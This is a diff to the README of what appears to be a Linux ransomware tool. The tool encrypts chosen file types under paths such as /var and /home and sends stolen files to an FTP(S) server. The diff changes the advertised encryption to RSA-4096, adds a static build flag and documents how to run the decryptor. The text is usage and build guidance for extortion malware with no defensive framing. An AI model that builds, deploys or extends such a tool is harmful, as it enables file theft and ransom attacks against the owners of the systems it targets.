@@ -8,7 +8,7 @@ tool targeting x86_64 Linux systems, written in C.
 - Build static encryption and decrypiton tools
 - Steal files using a FTP(S) server
 - Specify custom target paths
-- Uncrackable AES-256 encryption
+- Uncrackable RSA-4096 asymmetric encryption
 - Multi-threaded (a.k.a. fast)
 
 ## Build
@@ -29,7 +29,7 @@ build scripts:
 
 After building the static libraries, use the build script to create build with a random key:
 ```bash
-./scripts/build.sh
+./scripts/build.sh -static
 ```
 This should create the `encryptor` and the `decryptor` binares at `dist/`.
 
@@ -55,6 +55,11 @@ For example to encrypt `.sql` and `.db` files located at `/var` and `/home` with
 ```
 If you want to encrypt all files with all extensions, set `--exts` to `ALL`.
 
+Decryptor does not have any options, but can specify the target directory, by default it searches the entire file system (`/`):
+```bash
+./decryptor /var
+```
+
 ### Setting up FTP(S)
 For an actual FTP(S) setup you should install a FTP daemon such as `vsftpd` or `bftpd`. But for testing you can 
 use `pyftpdlib`:
@@ -69,6 +74,4 @@ python3 -m pyftpdlib -w
 - [C-Thread-Pool](https://github.com/Pithikos/C-Thread-Pool)
 - [CURL ftpupload](https://curl.se/libcurl/c/ftpupload.html)
 - [CURL options](https://curl.se/libcurl/c/easy_setopt_options.html)
-
----
-<img src="https://files.ngn.tf/gpl3.png" width="200px">
+- [OpenSSL RSA Demo](https://github.com/openssl/openssl/blob/master/demos/encrypt/rsa_encrypt.c)
